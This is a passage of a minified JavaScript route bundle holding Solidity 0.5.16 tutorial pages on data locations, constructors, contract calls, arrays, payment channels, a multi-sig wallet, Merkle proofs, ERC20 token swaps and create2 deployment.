data.</p>\n<ul>\n<li><code>storage</code> - variable is a state variable (store on blockchain)</li>\n<li><code>memory</code> - variable is in memory and it exists while a function is being called</li>\n<li><code>calldata</code> - special data location that contains function arguments, only available for <code>external</code> functions</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract DataLocations {\n    uint[] public arr;\n    mapping(uint =&gt; address) map;\n    struct MyStruct {\n        uint foo;\n    }\n    mapping(uint =&gt; MyStruct) myStructs;\n\n    function f() public {\n        // call _f with state variables\n        _f(arr, map, myStructs[1]);\n\n        // get a struct from a mapping\n        MyStruct storage myStruct = myStructs[1];\n        // create a struct in memory\n        MyStruct memory myMemStruct = MyStruct(0);\n    }\n\n    function _f(\n        uint[] storage _arr,\n        mapping(uint =&gt; address) storage _map,\n        MyStruct storage _myStruct\n    ) internal {\n        // do something with storage variables\n    }\n\n    // You can return memory variables\n    function g(uint[] memory _arr) public returns (uint[] memory) {\n        // do something with memory array\n    }\n\n    function h(uint[] calldata _arr) external {\n        // do something with calldata array\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/constructor",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Constructor",description:"Learn how to initialize smart contracts in Solidity using a constructor",html:'<p>A <code>constructor</code> is an optional function that is executed upon contract creation.</p>\n<p>Here are examples of how to pass arguments to <code>constructors</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// Base contract X\ncontract X {\n    string public name;\n\n    constructor(string memory _name) public {\n        name = _name;\n    }\n}\n\n// Base contract Y\ncontract Y {\n    string public text;\n\n    constructor(string memory _text) public {\n        text = _text;\n    }\n}\n\n// There are 2 ways to initialize parent contract with parameters.\n\n// Pass the parameters here in the inheritance list.\ncontract B is X("Input to X"), Y("Input to Y") {\n}\n\ncontract C is X, Y {\n    // Pass the parameters here in the constructor,\n    // similar to function modifiers.\n    constructor(string memory _name, string memory _text) X(_name) Y(_text) public {\n    }\n}\n\n// Parent constructors are always called in the order of inheritance\n// regardless of the order of parent contracts listed in the\n// constructor of the child contract.\n\n// Order of constructors called:\n// 1. Y\n// 2. X\n// 3. E\ncontract E is X, Y {\n    constructor() X("X was called") Y("Y was called") public {\n    }\n}\n\n// Order of constructors called:\n// 1. Y\n// 2. X\n// 3. E\ncontract F is X, Y {\n    constructor() Y("Y was called") X("X was called") public {\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/calling-contract",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Calling Other Contract",description:"In Solidity, contract can call other contracts in several ways",html:'<p>Contract can call other contracts in 2 ways.</p>\n<p>The easiest way to is to just call it, like <code>A.foo(x, y, z)</code>.</p>\n<p>Another way to call other contracts is to use the low-level <code>call</code>.</p>\n<p>This method is not recommended.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Callee {\n    uint public x;\n    uint public value;\n\n    function setX(uint _x) public returns (uint) {\n        x = _x;\n        return x;\n    }\n\n    function setXandSendEther(uint _x) public payable returns (uint, uint) {\n        x = _x;\n        value = msg.value;\n\n        return (x, value);\n    }\n}\n\ncontract Caller {\n    function setX(Callee _callee, uint _x) public {\n        uint x = _callee.setX(_x);\n    }\n\n    function setXFromAddress(address _addr, uint _x) public {\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    function setXandSendEther(Callee _callee, uint _x) public payable {\n        (uint x, uint value) = _callee.setXandSendEther.value(msg.value)(_x);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/call",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Call",description:"In Solidity call is a low level function to interact with other contracts",html:'<p><code>call</code> is a low level function to interact with other contracts.</p>\n<p>This is the recommended method to use when you&#39;re just sending Ether via calling the <code>fallback</code> function.</p>\n<p>However it is not the recommend way to call existing functions.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Receiver {\n    event Received(address caller, uint amount, string message);\n\n    function () external payable {\n        emit Received(msg.sender, msg.value, "Fallback was called");\n    }\n\n    function foo(string memory _message, uint _x) public payable returns (uint) {\n        emit Received(msg.sender, msg.value, _message);\n\n        return _x + 1;\n    }\n}\n\ncontract Caller {\n    event Response(bool success, bytes data);\n\n    // Let&#39;s imagine that contract B does not have the source code for\n    // contract A, but we do know the address of A and the function to call.\n    function testCallFoo(address payable _addr) public payable {\n        // You can send ether and specify a custom gas amount\n        (bool success, bytes memory data) = _addr.call.value(msg.value).gas(5000)(\n            abi.encodeWithSignature("foo(string,uint256)", "call foo", 123)\n        );\n\n        emit Response(success, data);\n    }\n\n    // Calling a function that does not exist triggers the fallback function.\n    function testCallDoesNotExist(address _addr) public {\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature("doesNotExist()")\n        );\n\n        emit Response(success, data);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/array",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Array",description:"Learn about arrays in Solidity",html:'<p>Array can have a compile-time fixed size or a dynamic size.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Array {\n    // Several ways to initialize an array\n    uint[] public arr;\n    uint[] public arr2 = [1,2,3];\n    // Fixed sized array, all elements initialize to 0\n    uint[10] public myFixedSizeArr;\n\n    function get(uint i) public view returns (uint) {\n        return arr[i];\n    }\n\n    // Solidity can return the entire array.\n    // But this function should be avoided for\n    // arrays that can grow indefinitely in length.\n    function getArr() public view returns (uint[] memory) {\n        return arr;\n    }\n\n    function push(uint i) public {\n        // Append to array\n        // This will increase the array length by 1.\n        arr.push(i);\n    }\n\n    function pop() public {\n        // Remove last element from array\n        // This will decrease the array length by 1\n        arr.pop();\n    }\n\n    function getLength() public view returns (uint) {\n        return arr.length;\n    }\n\n    function remove(uint index) public {\n        // Delete does not change the array length.\n        // It resets the value at index to it&#39;s default value,\n        // in this case 0\n        delete arr[index];\n    }\n}\n\ncontract CompactArray {\n    uint[] public arr;\n\n    // Deleting an element creates a gap in the array.\n    // One trick to keep the array compact is to\n    // move the last element into the place to delete.\n    function remove(uint index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        // Remove the last element\n        arr.pop();\n    }\n\n    function test() public {\n        arr.push(1);\n        arr.push(2);\n        arr.push(3);\n        arr.push(4);\n        // [1, 2, 3, 4]\n\n        remove(1);\n        // [1, 4, 3]\n\n        remove(2);\n        // [1, 4]\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/app/uni-directional-payment-channel",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Uni-Directional Payment Channel",description:"An example of uni-directional payment channels in Solidity",html:'<p>Payment channels allow participants to repeatedly transfer Ether off chain.</p>\n<p>Here is how this contract is used:</p>\n<ul>\n<li><code>Alice</code> deploys the contract, funding it with some Ether.</li>\n<li><code>Alice</code> authorizes a payment by signing a message (off chain) and sends the signature to <code>Bob</code>.</li>\n<li><code>Bob</code> claims his payment by presenting the signed message to the smart contract.</li>\n<li>If <code>Bob</code> does not claim his payment, <code>Alice</code> get her Ether back after the contract expires</li>\n</ul>\n<p>This is called a uni-directional payment channel since the payment can go only in a signle direction from <code>Alice</code> to <code>Bob</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/math/SafeMath.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/cryptography/ECDSA.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/utils/ReentrancyGuard.sol";\n\n\ncontract UniDirectionalPaymentChannel is ReentrancyGuard {\n    using SafeMath for uint;\n    using ECDSA for bytes32;\n\n    address payable public payer;\n    address payable public payee;\n\n    uint public expiresAt;\n\n    constructor(address payable _payee, uint _expiresAt) public payable {\n        require(_expiresAt &gt; block.timestamp, "Expiration must be &gt; now");\n\n        payer = msg.sender;\n        payee = _payee;\n\n        expiresAt = _expiresAt;\n    }\n\n    function verify(\n        bytes memory _signature,\n        address _payer,\n        address _contract,\n        uint _payeeBalance\n    ) public pure returns (bool) {\n        // NOTE: sign with address of this contract to protect agains\n        // replay attack on other contracts\n        return\n            keccak256(abi.encodePacked(_contract, _payeeBalance))\n                .toEthSignedMessageHash()\n                .recover(_signature) == _payer;\n    }\n\n    modifier checkSignature(bytes memory _signature, uint _payeeBalance) {\n        require(\n            verify(_signature, payer, address(this), _payeeBalance),\n            "Invalid signature"\n        );\n        _;\n    }\n\n    function close(uint _payeeBalance, bytes memory _signature)\n        public\n        nonReentrant\n        checkSignature(_signature, _payeeBalance)\n    {\n        require(msg.sender == payee, "Not payee");\n\n        (bool sent, ) = payee.call.value(_payeeBalance)("");\n        require(sent, "Failed to send Ether");\n\n        selfdestruct(payer);\n    }\n\n    function kill() public {\n        require(msg.sender == payer, "Not payer");\n        require(block.timestamp &gt;= expiresAt, "channel not expired");\n        selfdestruct(payer);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/app/multi-sig-wallet",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Multi-Sig Wallet",description:"An example of multi-sig wallet in Solidity",html:'<p>Let&#39;s create an multi-sig wallet. Here are the specifications.</p>\n<p>The wallet owners can</p>\n<ul>\n<li>submit a transaction</li>\n<li>approve and revoke approval of pending transcations</li>\n<li>anyone can execute a transcation after enough owners has approved it.</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract MultiSigWallet {\n    event Deposit(address indexed sender, uint amount, uint balance);\n    event SubmitTransaction(\n        address indexed owner,\n        uint indexed txIndex,\n        address indexed to,\n        uint value,\n        bytes data\n    );\n    event ConfirmTransaction(address indexed owner, uint indexed txIndex);\n    event RevokeConfirmation(address indexed owner, uint indexed txIndex);\n    event ExecuteTransaction(address indexed owner, uint indexed txIndex);\n\n    address[] public owners;\n    mapping(address =&gt; bool) public isOwner;\n    uint public numConfirmationsRequired;\n\n    struct Transaction {\n        address to;\n        uint value;\n        bytes data;\n        bool executed;\n        mapping(address =&gt; bool) isConfirmed;\n        uint numConfirmations;\n    }\n\n    Transaction[] public transactions;\n\n    modifier onlyOwner() {\n        require(isOwner[msg.sender], "not owner");\n        _;\n    }\n\n    modifier txExists(uint _txIndex) {\n        require(_txIndex &lt; transactions.length, "tx does not exist");\n        _;\n    }\n\n    modifier notExecuted(uint _txIndex) {\n        require(!transactions[_txIndex].executed, "tx already executed");\n        _;\n    }\n\n    modifier notConfirmed(uint _txIndex) {\n        require(!transactions[_txIndex].isConfirmed[msg.sender], "tx already confirmed");\n        _;\n    }\n\n    constructor(address[] memory _owners, uint _numConfirmationsRequired) public {\n        require(_owners.length &gt; 0, "owners required");\n        require(\n            _numConfirmationsRequired &gt; 0 &amp;&amp; _numConfirmationsRequired &lt;= _owners.length,\n            "invalid number of required confirmations"\n        );\n\n        for (uint i = 0; i &lt; _owners.length; i++) {\n            address owner = _owners[i];\n\n            require(owner != address(0), "invalid owner");\n            require(!isOwner[owner], "owner not unique");\n\n            isOwner[owner] = true;\n            owners.push(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    function () payable external {\n        emit Deposit(msg.sender, msg.value, address(this).balance);\n    }\n\n    function submitTransaction(address _to, uint _value, bytes memory _data)\n        public\n        onlyOwner\n    {\n        uint txIndex = transactions.length;\n\n        transactions.push(Transaction({\n            to: _to,\n            value: _value,\n            data: _data,\n            executed: false,\n            numConfirmations: 0\n        }));\n\n        emit SubmitTransaction(msg.sender, txIndex, _to, _value, _data);\n    }\n\n    function confirmTransaction(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n        notConfirmed(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        transaction.isConfirmed[msg.sender] = true;\n        transaction.numConfirmations += 1;\n\n        emit ConfirmTransaction(msg.sender, _txIndex);\n    }\n\n    function executeTransaction(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(\n            transaction.numConfirmations &gt;= numConfirmationsRequired,\n            "cannot execute tx"\n        );\n\n        transaction.executed = true;\n\n        (bool success, ) = transaction.to.call.value(transaction.value)(transaction.data);\n        require(success, "tx failed");\n\n        emit ExecuteTransaction(msg.sender, _txIndex);\n    }\n\n    function revokeConfirmation(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(transaction.isConfirmed[msg.sender], "tx not confirmed");\n\n        transaction.isConfirmed[msg.sender] = false;\n        transaction.numConfirmations -= 1;\n\n        emit RevokeConfirmation(msg.sender, _txIndex);\n    }\n\n    function getOwners() public view returns (address[] memory) {\n        return owners;\n    }\n\n    function getTransactionCount() public view returns (uint) {\n        return transactions.length;\n    }\n\n    function getTransaction(uint _txIndex)\n        public\n        view\n        returns (address to, uint value, bytes memory data, bool executed, uint numConfirmations)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return (\n            transaction.to,\n            transaction.value,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n\n    function isConfirmed(uint _txIndex, address _owner)\n        public\n        view\n        returns (bool)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return transaction.isConfirmed[_owner];\n    }\n}\n</code></pre>\n<p>Here is a contract to test sending transactions from the multi-sig wallet</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract TestContract {\n    uint public i;\n\n    function callMe(uint j) public {\n        i += j;\n    }\n\n    function getData() public view returns (bytes memory) {\n        return abi.encodeWithSignature("callMe(uint256)", 123);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/app/merkle-tree",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Merkle Tree",description:"Learn about Merkle tree in Solidity",html:'<p>Merkle tree allows you to cryptographically prove that an element is contained</p>\n<p>in a set without revealing the entire set.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract MerkleProof {\n    function verify(\n        bytes32[] memory proof, bytes32 root, bytes32 leaf, uint index\n    )\n        public pure returns (bool)\n    {\n        bytes32 hash = leaf;\n\n        for (uint i = 0; i &lt; proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n}\n\ncontract TestMerkleProof is MerkleProof {\n    bytes32[] public hashes;\n\n    constructor() public {\n        string[4] memory transactions = [\n            "alice -&gt; bob",\n            "bob -&gt; dave",\n            "carol -&gt; alice",\n            "dave -&gt; bob"\n        ];\n\n        for (uint i = 0; i &lt; transactions.length; i++) {\n            hashes.push(keccak256(abi.encodePacked(transactions[i])));\n        }\n\n        uint n = transactions.length;\n        uint offset = 0;\n\n        while (n &gt; 0) {\n            for (uint i = 0; i &lt; n - 1; i+=2) {\n                hashes.push(\n                    keccak256(abi.encodePacked(\n                        hashes[offset + i],\n                        hashes[offset + i + 1]\n                    ))\n                );\n            }\n            offset += n;\n            n = n / 2;\n        }\n    }\n\n    function getRoot() public view returns (bytes32) {\n        return hashes[hashes.length - 1];\n    }\n\n    /* verify\n    3rd leaf\n    0x1bbd78ae6188015c4a6772eb1526292b5985fc3272ead4c65002240fb9ae5d13\n\n    root\n    0x074b43252ffb4a469154df5fb7fe4ecce30953ba8b7095fe1e006185f017ad10\n\n    index\n    2\n\n    proof\n    0x948f90037b4ea787c14540d9feb1034d4a5bc251b9b5f8e57d81e4b470027af8\n    0x63ac1b92046d474f84be3aa0ee04ffe5600862228c81803cce07ac40484aee43\n    */\n}\n</code></pre>\n'})}},{path:"/0.5/app/iterable-mapping",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Iterable Mapping",description:"Iterable Mapping in Solidity",html:'<p>You cannot iterate through a <code>mapping</code>. So here is an example of how to create an iterable <code>mapping</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\nlibrary IterableMapping {\n    // Iterable mapping from address to uint;\n    struct Map {\n        address[] keys;\n        mapping(address =&gt; uint) values;\n        mapping(address =&gt; uint) indexOf;\n        mapping(address =&gt; bool) inserted;\n    }\n\n    function get(Map storage map, address key) public view returns (uint) {\n        return map.values[key];\n    }\n\n    function getKeyAtIndex(Map storage map, uint index) public view returns (address) {\n        return map.keys[index];\n    }\n\n    function size(Map storage map) public view returns (uint) {\n        return map.keys.length;\n    }\n\n    function set(Map storage map, address key, uint val) public {\n        if (map.inserted[key]) {\n            map.values[key] = val;\n        } else {\n            map.inserted[key] = true;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.length;\n            map.keys.push(key);\n        }\n    }\n\n    function remove(Map storage map, address key) public {\n        if (!map.inserted[key]) {\n            return;\n        }\n\n        delete map.inserted[key];\n        delete map.values[key];\n\n        uint index = map.indexOf[key];\n        uint lastIndex = map.keys.length - 1;\n        address lastKey = map.keys[lastIndex];\n\n        map.indexOf[lastKey] = index;\n        delete map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.pop();\n    }\n}\n\ncontract TestIterableMap {\n    using IterableMapping for IterableMapping.Map;\n\n    IterableMapping.Map private map;\n\n    function testIterableMap() public {\n        map.set(address(0), 0);\n        map.set(address(1), 100);\n        map.set(address(2), 200); // insert\n        map.set(address(2), 200); // update\n        map.set(address(3), 300);\n\n        for (uint i = 0; i &lt; map.size(); i++) {\n            address key = map.getKeyAtIndex(i);\n\n            assert(map.get(key) == i * 100);\n        }\n\n        map.remove(address(1));\n\n        // keys = [address(0), address(3), address(2)]\n        assert(map.size() == 3);\n        assert(map.getKeyAtIndex(0) == address(0));\n        assert(map.getKeyAtIndex(1) == address(3));\n        assert(map.getKeyAtIndex(2) == address(2));\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/app/erc20",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"ERC20",description:"Example of ERC20 token in Solidity",html:'<p>Any contract that follow the <a href="https://eips.ethereum.org/EIPS/eip-20" target="__blank">ERC20 standard</a> is a ERC20 token.</p>\n<p>ERC20 tokens provide functionalities to</p>\n<ul>\n<li>transfer tokens</li>\n<li>allow others to transfer tokens on behalf of the token holder</li>\n</ul>\n<p>Here is the interface for ERC20.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC20/IERC20.sol\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n</code></pre>\n<h2 id="create-your-own-erc20-token">Create your own ERC20 token</h2>\n<p>Using <a href="https://github.com/OpenZeppelin/openzeppelin-contracts" target="__blank">Open Zeppelin</a> it&#39;s really easy to create your own ERC20 token.</p>\n<p>Here is an example</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC20/ERC20Detailed.sol";\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC20/ERC20Mintable.sol";\n\ncontract MyToken is ERC20Detailed, ERC20Mintable {\n    constructor (string memory name, string memory symbol)\n        ERC20Detailed(name, symbol, 18)\n        public\n    {\n        // Mint 100 tokens to msg.sender\n        // Similar to how\n        // 1 dollar = 100 cents\n        // 1 token = 1 * (10 ** decimals)\n        _mint(msg.sender, 100 * 10 ** uint(decimals()));\n    }\n}</code></pre>\n<h2 id="contract-to-swap-tokens">Contract to swap tokens</h2>\n<p>Here is an example contract, <code>TokenSwap</code>, to trade one ERC20 token for another.</p>\n<p>This contract will swap tokens by calling</p>\n<pre><code class="language-solidity">transferFrom(address sender, address recipient, uint256 amount)\n</code></pre>\n<p>which will transfer <code>amount</code> of token from <code>sender</code> to <code>recipient</code>.</p>\n<p>For <code>transferFrom</code> to succeed, <code>sender</code> must</p>\n<ul>\n<li>have more than <code>amount</code> tokens in their balance</li>\n<li>allowed <code>TokenSwap</code> to withdraw <code>amount</code> tokens by calling <code>approve</code></li>\n</ul>\n<p>prior to <code>TokenSwap</code> calling <code>transferFrom</code></p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC20/IERC20.sol";\n\n/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice appproves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob appproves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap(10, 20)\n8. Alice and Bob traded tokens successfully.\n*/\n\ncontract TokenSwap {\n    IERC20 public token1;\n    address public owner1;\n    IERC20 public token2;\n    address public owner2;\n\n    constructor(\n        address _token1,\n        address _owner1,\n        address _token2,\n        address _owner2\n    ) public {\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n    }\n\n    function swap(uint _amount1, uint _amount2) public {\n        require(msg.sender == owner1 || msg.sender == owner2, "Not authorized");\n        require(\n            token1.allowance(owner1, address(this)) &gt;= _amount1,\n            "Token 1 allowance too low"\n        );\n        require(\n            token2.allowance(owner2, address(this)) &gt;= _amount2,\n            "Token 2 allowance too low"\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, _amount1);\n        _safeTransferFrom(token2, owner2, owner1, _amount2);\n    }\n\n    function _safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint amount\n    ) private {\n        bool sent = token.transferFrom(sender, recipient, amount);\n        require(sent, "Token transfer failed");\n    }\n}</code></pre>\n'})}},{path:"/0.5/app/create2",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Precompute Contract Address with Create2",description:"Precompute contract address with create2",html:'<p>Contract address can be precomputed, before the contract is deployed, using <code>create2</code></p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Factory {\n    event Deployed(address addr, uint256 salt);\n\n    // 1. Get bytecode of contract to be deployed\n    // NOTE: _owner and _foo are arguments of the TestContract&#39;s constructor\n    function getBytecode(address _owner, uint _foo) public pure returns (bytes memory) {\n        bytes memory bytecode = type(TestContract).creationCode;\n\n        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));\n    }\n\n    // 2. Compute the address of the contract to be deployed\n    // NOTE: _salt is a random number used to create an address\n    function getAddress(bytes memory bytecode, uint _salt) public view returns (address) {\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                byte(0xff),\n                address(this),\n                _salt,\n                keccak256(bytecode)\n            )\n        );\n\n        // NOTE: cast last 20 bytes of hash to address\n        return address(uint160(uint256(hash)));\n    }\n\n    // 3. Deploy the contract\n    // NOTE:\n    // Check the event log Deployed which contains the address of the deployed TestContract.\n    // The address in the log should equal the address computed from above.\n    function deploy(bytes memory bytecode, uint _salt) public payable {\n        address addr;\n\n        /*\n        NOTE: How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p\u2026(p+n)))\n              s = big-endian 256-bit value\n        */\n        assembly {\n            addr := create2(\n                callvalue(), // wei sent with current call\n                // Actual code starts after skipping the first 32 bytes\n                add(bytecode, 0x20),\n                mload(bytecode), // Load the size of code contained in the first 32 bytes\n                _salt // Salt from function arguments\n            )\n\n            if iszero(extcodesize(addr)) {\n                revert(0, 0)\n            }\n        }\n\n        emit Deployed(addr, _salt);\n    }\n}\n\ncontract TestContract {\n    address public owner;\n    uint public foo;\n\n    constructor(address _owner, uint _foo) public payable {\n        owner = _owner;\n        foo = _foo;\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/app/bi-directional-payment-channel",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Bi-Directional Payment Channel",description:"An example of bi-directional payment channels in Solidity",html:'<p>Bi-directional payment channels allow participants <code>Alice</code> and <code>Bob</code> to repeatedly transfer Ether off chain.</p>\n<p>Payments can go both ways, <code>Alice</code> pays <code>Bob</code> and <code>Bob</code> pays <code>Alice</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\npragma experimental ABIEncoderV2;\n\n/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/\n\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/math/SafeMath.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/cryptography/ECDSA.sol";\n\ncontract BiDirectionalPaymentChannel {\n    using SafeMath for uint;\n    using ECDSA for bytes32;\n\n    event ChallengeExit(address indexed sender, uint nonce);\n    event Withdraw(address indexed to, uint amount);\n\n    address payable[2] public users;\n    mapping(address =&gt; bool) public isUser;\n\n    mapping(address =&gt; uint) public balances;\n\n    uint public challengePeriod;\n    uint public expiresAt;\n    uint public nonce;\n\n    modifier checkBalances(uint[2] memory _balances) {\n        require(\n            address(this).balance &gt;= _balances[0].add(_balances[1]),\n            "balance of contract must be &gt;= to the total balance of users"\n        );\n        _;\n    }\n\n    // NOTE: deposit from multi-sig wallet\n    constructor(\n        address payable[2] memory _users,\n        uint[2] memory _balances,\n        uint _expiresAt,\n        uint _challengePeriod\n    ) public payable checkBalances(_balances) {\n        require(_expiresAt &gt; block.timestamp, "Expiration must be &gt; now");\n        require(_challengePeriod &gt; 0, "Challenge period must be &gt; 0");\n\n        for (uint i = 0; i &lt; _users.length; i++) {\n            address payable user = _users[i];\n\n            require(!isUser[user], "user must be unique");\n            users[i] = user;\n            isUser[user] = true;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    function verify(\n        bytes[2] memory _signatures,\n        address _contract,\n        address[2] memory _signers,\n        uint[2] memory _balances,\n        uint _nonce\n    ) public pure returns (bool) {\n        for (uint i = 0; i &lt; _signatures.length; i++) {\n            /*\n            NOTE: sign with address of this contract to protect\n                  agains replay attack on other contracts\n            */\n            bool valid = _signers[i] ==\n                keccak256(abi.encodePacked(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash()\n                    .recover(_signatures[i]);\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    modifier checkSignatures(\n        bytes[2] memory _signatures,\n        uint[2] memory _balances,\n        uint _nonce\n    ) {\n        // NOTE: need to cast payable address to address type (not in 0.6)\n        address[2] memory signers;\n        for (uint i = 0; i &lt; users.length; i++) {\n            signers[i] = address(users[i]);\n        }\n\n        require(\n            verify(_signatures, address(this), signers, _balances, _nonce),\n            "Invalid signature"\n        );\n\n        _;\n    }\n\n    modifier onlyUser() {\n        require(isUser[msg.sender], "Not user");\n        _;\n    }\n\n    function challengeExit(\n        uint[2] memory _balances,\n        uint _nonce,\n        bytes[2] memory _signatures\n    )\n        public\n        onlyUser\n        checkSignatures(_signatures, _balances, _nonce)\n        checkBalances(_balances)\n    {\n        require(block.timestamp &lt; expiresAt, "Expired challenge period");\n        require(_nonce &gt; nonce, "Nonce must be greater than the current nonce");\n\n        for (uint i = 0; i &lt; _balances.length; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = block.timestamp.add(challengePeriod);\n\n        emit ChallengeExit(msg.sender, nonce);\n    }\n\n    function withdraw() public onlyUser {\n        require(\n            block.timestamp &gt;= expiresAt,\n            "Challenge period has not expired yet"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call.value(amount)("");\n        require(sent, "Failed to send Ether");\n\n        emit Withdraw(msg.sender, amount);\n    }\n}\n</code></pre>\n'})}}];var O=function(){return 